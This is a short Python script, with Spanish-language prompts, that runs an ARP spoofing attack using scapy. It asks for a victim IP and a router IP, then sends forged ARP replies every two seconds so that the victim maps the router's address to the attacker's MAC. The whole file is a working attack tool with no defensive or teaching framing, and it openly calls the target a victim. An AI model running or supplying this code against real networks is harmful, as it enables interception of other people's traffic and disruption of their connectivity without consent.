from scapy.all import ARP, send, getmacbyip
import time

def arp_spoof(target_ip, router_ip):
    attacker_mac = ARP().hwsrc
    target_mac = getmacbyip(target_ip)
    router_mac = getmacbyip(router_ip)

    if not target_mac or not router_mac:
        print("Error: No se pudo obtener la dirección MAC de la víctima o del router.")
        return

    arp_response_victim = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=attacker_mac)

    print(f"Iniciando ataque ARP Spoofing a {target_ip}")
    try:
        while True:
            send(arp_response_victim, verbose=False)
            print(f"Enviando ARP spoofing a {target_ip}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nAtaque ARP Spoofing detenido.")

if __name__ == "__main__":
    target_ip = input("Ingrese la IP de la máquina víctima: ")
    router_ip = input("Ingrese la IP del router: ")
    arp_spoof(target_ip, router_ip)
